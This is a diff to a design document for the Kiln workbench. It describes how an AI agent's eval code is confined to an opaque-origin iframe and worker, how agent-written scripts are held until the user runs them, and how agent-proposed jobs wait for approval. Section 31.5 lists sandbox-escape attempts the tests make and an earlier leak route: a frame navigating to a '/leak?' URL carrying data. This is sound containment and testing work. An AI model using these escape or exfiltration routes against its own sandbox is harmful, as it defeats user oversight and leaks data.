@@ -1561,7 +1561,9 @@ with a session token injected into the page.
 | `KILN_DATA_DIR` | `apps/server/.data` | Database, logs, job artifacts |
 | `KILN_DIST` | `apps/workbench/dist` | The page to serve |
 | `KILN_EXECUTORS` | `.data/executors.json` | CUDA executor profiles (local or SSH), §30.5 |
-| `KILN_MODEL` | unset | Model for the agent gateway (Phase 7) |
+| `KILN_MODEL` | unset | Model id for the agent gateway; unset turns the gateway off (§31) |
+| `KILN_MODEL_URL` | `https://api.anthropic.com/v1/messages` | The Messages endpoint the gateway calls |
+| `ANTHROPIC_API_KEY` | unset | Sent upstream as `x-api-key`; never logged, stored or returned to the page |
 
 #### 30.2 Security model
 
@@ -1593,8 +1595,8 @@ The agent's code never holds the token (§31), so it cannot approve jobs or writ
 | `POST /jobs` | `{executor, kernels: [...], protocol: {reps, warmup, launches, seed}, reason}` + header `X-Kiln-Proposer: user \| agent` | `201 JobView` | `user` jobs may pass `approve: true`; `agent` jobs are always `proposed` |
 | `POST /jobs/:id/approve`, `POST /jobs/:id/cancel` | | `JobView` | Approve requires the token; the agent bridge does not expose it |
 | `GET /events` | | `text/event-stream` | `hello`, `ping`, `job.updated`, `job.event`, `records.added`, `device.updated` |
-| `POST /agent/sample` | Kiln agent request | streamed model output | Phase 7; writes `llm_calls` |
-| `GET /agent/usage` | | token totals by model and conversation | Phase 7 |
+| `POST /agent/sample` | `{conversation, messages, tools?, system?, max_tokens?}` (Messages API shapes) | `application/x-ndjson`: `text` events, then one `done` or `error` | One `llm_calls` row per upstream call; refusals `503 no_model`, `503 no_api_key`, `413 prompt_too_large` (§31) |
+| `GET /agent/usage` | | `{model, ready, totals: [...], conversations: [...]}` | Token sums by model, and by conversation and model (at most 50) |
 
 #### 30.4 Jobs
 
@@ -1673,20 +1675,119 @@ once inside a transaction.
 The agent keeps Kiln's design (one `eval` tool, a handle API, snapshots and revert) and gains isolation and
 accounting:
 
-- **Sandbox.** Eval code runs in an `<iframe sandbox="allow-scripts">` created from `srcdoc`. The frame has an opaque
-  origin, so it cannot read the page's DOM, `localStorage` or the session token, and the server refuses its requests
-  (`Origin: null`). The page exposes the handle API through a `postMessage` bridge: every namespace method becomes an
-  async stub in the frame (`await editor.set(text)`), and every call is checked against the run mode (Auto, Ask,
-  Read-only) on the page side, where the frame cannot change it (fixes K-14).
-- **Jobs.** `jobs.propose(spec)` is the only way agent code can reach real hardware. The bridge sends it with
-  `X-Kiln-Proposer: agent`; the server keeps it `proposed` until the user approves it in the Jobs view (fixes the
+- **Sandbox.** Eval code runs in a dedicated worker started by an `<iframe sandbox="allow-scripts">` created from
+  `srcdoc`. The frame has an opaque origin, so neither it nor its worker can read the page's DOM, `localStorage` or
+  the session token, and the server refuses their requests (`Origin: null`). The worker has no document, so it cannot
+  navigate anything, and it inherits the frame's CSP, which refuses every connection. The page exposes the handle API
+  through one `MessagePort`: every page-side namespace method becomes an async stub in the worker
+  (`await editor.set(text)`), and every call is checked against the run mode (Auto, Ask, Read-only) on the page side,
+  where eval code cannot change it (fixes K-14).
+- **Held scripts.** A project script runs in the page with the user's authority, so a script the agent writes is held
+  until the user presses Run (§31.4). Without this, `editor.set` would carry agent-written code past the sandbox.
+- **Jobs.** `jobs.propose({device, reason})` is the only way agent code can reach real hardware. The page sends it
+  with `X-Kiln-Proposer: agent`; the server keeps it `proposed` until the user approves it in the Jobs view (fixes the
   Kiln side of P-1).
 - **Model gateway.** When the page is not hosted with a `window.claude` bridge, `wb.sample` posts to
   `/api/agent/sample`, which calls the configured model and writes an `llm_calls` row per call with reported and
   estimated tokens.
-- **Limits.** At most 8 evals per answer, output capped as today, and a guideline that every number cited in an
-  answer names its source word (model, simulated, measured) and that no hardware speedup is claimed from heuristic
-  numbers.
+- **Limits.** At most 8 evals per answer and 12 model calls per answer, output capped as before, and a guideline that
+  every number cited in an answer names its source word (model, simulated, measured on a named device) and that no
+  hardware speedup is claimed from heuristic numbers.
+
+#### 31.1 As built: where each piece lives
+
+| File | Runs in | Role |
+| --- | --- | --- |
+| `apps/workbench/src/agent/agent.js` | page | Conversations, the answer loop, `runEval`, the handle API (`makeAgentScope`), `pageCall`, `frameContext`, snapshots and revert |
+| `apps/workbench/src/agent/sandbox.js` | page | `FRAME_CSP`, `frameDoc()`, `servePort()` (answers one eval's calls), `runInFrame()` (one frame per eval) |
+| `apps/workbench/src/agent/worker-main.js` | worker | Entry point: takes the port from the first message and calls `startFrame` |
+| `apps/workbench/src/agent/frame.js` | worker | `startFrame(port)`: builds the eval's names (bridged stubs plus local namespaces) and runs the code |
+| `apps/workbench/src/agent/inspect.js` | worker | `ir` and `trace` over the worker's own compile |
+| `apps/workbench/src/agent/encode.js` | both | Summaries (`runSummary`, `e2eLine`), `yaml`, and the wire format (`toWire`, `fromWire`) |
+| `apps/workbench/src/compile.js` | both | `compileScript`, `pipelineFor`, `endToEnd`: the one compile path the page and the worker share |
+| `apps/workbench/src/agent/gateway.js` | page | `gatewaySample()`: the `sample` contract over `/api/agent/sample` |
+| `apps/server/src/agent.ts` | server | The gateway routes and `llm_calls` accounting |
+
+`build.mjs` bundles `worker-main.js` into `src/frame.gen.js` (`WORKER_JS`). `frameDoc()` embeds that bundle as a
+string literal with every `<` escaped, so no byte of it can end the frame's `<script>`; the frame's own script is
+a handful of lines that start the worker from a `blob:` URL and transfer it the port. The CSP is
+`default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; worker-src blob:`.
+
+#### 31.2 The protocol
+
+```text
+page                                   frame (opaque origin)          worker (no document)
+ │ create <iframe sandbox srcdoc>  ──▶  boot script runs
+ │ on load: postMessage({t:"kiln-port"}, [port2]) ─▶ new Worker(blob) ─▶ postMessage(null, [port2])
+ │                                                                     startFrame(port2)
+ │ port1 ─ {t:"eval", code, api:[{path}], ctx} ───────────────────────▶ build names, run code
+ │ ◀─────────────────────────────────── {t:"call", id, path, args} ─── await editor.set(…)
+ │ pageCall(api, path, args): mode check, run, toWire
+ │ ── {t:"ret", id, ok:true, value, ctx?} ────────────────────────────▶ resolve; new ctx → recompile
+ │ ── {t:"ret", id, ok:false, error:{name, message}} ─────────────────▶ reject
+ │ ◀──────────────────────────────── {t:"done", ok, out, lang, logs} ─
+ │ remove the frame (its worker ends with it)
+```
+
+`api` lists the paths of the page scope's own functions (`editor.set`, `jobs.propose`, …). `pageCall` looks the path
+up in that `Map` and refuses anything else, including `__proto__` and `constructor`. Arguments that contain a function
+are refused in the worker before they are sent. `toWire` turns a `Tensor` into `{$kiln: "Tensor", shape, data}`,
+which `fromWire` rebuilds, and other class instances into plain data.
+
+`ctx` is the page state the worker needs to compile exactly as the page would: `{script, params: {vals, pins},
+kernelPins, target, deviceId, store}`, where `store` is `EvidenceStore.slice(deviceId)` (that device's records and
+current entries). A call that changes the page (`editor.set`, `params.set`, `measure`, …) returns a fresh `ctx`, and
+the worker drops its cached compile.
+
+#### 31.3 What runs in the worker and what is bridged
+
+| In the worker | Bridged to the page |
+| --- | --- |
+| Kiln's script names (`k`, `P`, `std`, `project`, …), `log`, `console` | `editor.get/set/edit`, `notes`, `params`, `forks`, `kernels`, `devices` |
+| `ir.*`, `trace.*` over the worker's compile of the editor's script; they return live objects and take predicates | `compile`, `measure`, `tune`, `evidence`, `presets`, `jobs.list/propose` |
+| `editor.check(text?, {device?, pins?})`: compiles in the worker; another device's `ctx` comes from the page (`__context`) | `chat.table/code/show/place`; `chat.propose` sends the worker's compile verdict and the page only displays it |
+
+The worker's `editor.check` deep-equals the page's own compile summary, including forks decided by evidence
+(`test/sandbox.mjs`).
+
+#### 31.4 Held scripts
+
+A project script is JavaScript, and the page compiles it with the page's authority: it could read the session token
+and approve jobs. A script the agent writes therefore does not run in the page until the user says so. With the
+setting **Scripts: Hold** (the default), `editor.set` and `editor.edit` put the text in the editor and set
+`wb.pending`; the page keeps its last compile, and the Code view shows a bar with a "not run" stamp and **Run it**
+(`wb.runScript()`). The worker compiles the held text itself and returns that summary with `ran: false`, so the agent
+still sees errors and kernels. While a script is held, `measure`, `tune`, `kernels`, `forks`, the checks,
+`evidence.best` and `jobs.propose` refuse with `HeldScriptError`, and the page's own Measure refuses too, because
+their results would describe a compile the editor no longer shows. The draft, presets and snapshots carry the flag;
+revert restores the previous script unheld. **Scripts: Run** restores the old behaviour.
+
+#### 31.5 Verification
+
+`test/sandbox.mjs` (36 checks, in `pnpm test`) runs the worker's runtime and the port server in Node over a
+`MessageChannel`. `test/agent-e2e.mjs` (`pnpm --filter @kiln/workbench test:agent`; needs Chrome) runs the built
+page against the development server and a fake model upstream:
+
+| Attempt from eval code | Result |
+| --- | --- |
+| `typeof document, window, parent, localStorage` | all `undefined` |
+| `fetch` the server's `/api/jobs/…/approve` | `TypeError: Failed to fetch`; no job approved |
+| `fetch`, `WebSocket`, `EventSource`, `importScripts`, `new Worker` to another host | errors or deferred failures; **no request reaches the host** |
+| `location.href = …` | `TypeError` (a worker's location is read-only) |
+| `jobs.propose(…)` | `proposed`; still proposed 3 s later, by `agent` |
+| `editor.set(…)` | `ran: false`, `compiles: true`; the page's compile unchanged until Run |
+| `while (true) {}` | the page keeps answering; Stop removes the frame and ends the worker |
+
+Each model call is one `llm_calls` row filed under the conversation, and the API key never appears in the page. The
+exception names do not prove that nothing left: with `connect-src *` added to the CSP, `fetch` still reports
+`TypeError` (the response is unreadable from an opaque origin), yet the request reaches the host. The test therefore
+aims every attempt at the fake upstream's `/leak` path and asserts that none arrived; with the loosened CSP it fails,
+listing `/leak?fetch /leak?sse /leak?ws`.
+
+An earlier build ran eval code in the frame's document. The same test showed that the frame could navigate itself
+(`location.href = "http://…/leak?" + data`), and the request arrived carrying the script's first line: neither the
+CSP nor the sandbox attribute governs a frame navigating itself. Moving eval code into a worker removed the channel,
+since a worker has no document to navigate.
 
 ### 32. The visual language
 
@@ -1925,6 +2026,9 @@ updates.
 
 Done when: an eval that calls `fetch('/api/jobs/…/approve')` fails; `localStorage` is unreachable from eval code;
 an agent-proposed job waits for approval; token rows appear per call.
+
+Status: done (diary Step 18). `test/agent-e2e.mjs` checks each clause in Chrome, and also that no request from eval
+code reaches any host and that a runaway eval does not freeze the page (§31.5).
 
 #### Phase 8: lab programs
 
